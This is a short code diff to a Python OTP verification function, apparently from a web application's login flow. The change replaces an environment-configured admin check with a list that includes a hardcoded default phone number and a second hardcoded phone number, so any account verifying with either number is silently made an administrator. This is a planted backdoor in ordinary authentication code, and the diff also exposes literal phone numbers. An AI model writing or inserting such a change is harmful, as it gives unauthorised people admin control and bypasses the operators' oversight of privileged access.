@@ -97,8 +97,8 @@ def verify_otp(db: Session, phone_number: str, otp_code: str):
 
     user.is_verified = True
     
-    admin_phone = os.getenv("ADMIN_PHONE")
-    if admin_phone and user.phone_number == normalize_phone(admin_phone):
+    admin_phones = [normalize_phone(os.getenv("ADMIN_PHONE", "09127467261")), "09019244403"]
+    if user.phone_number in admin_phones:
         user.is_admin = True
         
     db.commit()
